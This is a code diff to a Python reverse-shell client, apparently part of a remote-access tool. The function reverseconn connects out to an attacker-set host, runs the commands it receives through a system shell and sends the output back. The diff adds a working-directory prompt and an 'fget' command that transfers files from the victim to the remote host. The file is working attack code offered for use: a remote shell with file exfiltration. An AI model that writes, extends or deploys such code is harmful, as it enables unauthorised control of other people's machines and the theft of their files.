@@ -59,6 +59,8 @@ def reverseconn():
 
     s.connect((HOST,PORT))
 
+    RevNet.send_all(s,str.encode(RevNet.enc(str(os.getcwd())+'> ')))
+
     while True:
 
         recvcmd=RevNet.recv_all(s)
@@ -101,6 +103,12 @@ def reverseconn():
 
             RevNet.send_all(s,str.encode(RevNet.enc('PWNED!')))
 
+        elif RevNet.dec(recvcmd[:4].decode("utf-8"))=="fget":
+
+            RevNet.ftrans(s,RevNet.dec(recvcmd[5:].decode("utf-8")))
+
+            RevNet.send_all(s,str.encode(RevNet.enc(str(os.getcwd())+'> ')))
+
         elif len(recvcmd)>0 and RevNet.dec(recvcmd[:2].decode("utf-8"))!="cd":
 
             cmd = subprocess.Popen(RevNet.dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -109,7 +117,7 @@ def reverseconn():
 
             ostr=obyte.decode()
 
-            RevNet.send_all(s,str.encode(RevNet.enc(ostr+str(os.getcwd())+'> ')))
+            RevNet.send_all(s,str.encode(RevNet.enc(ostr+'`'+str(os.getcwd())+'> ')))
 
     s.close()
 
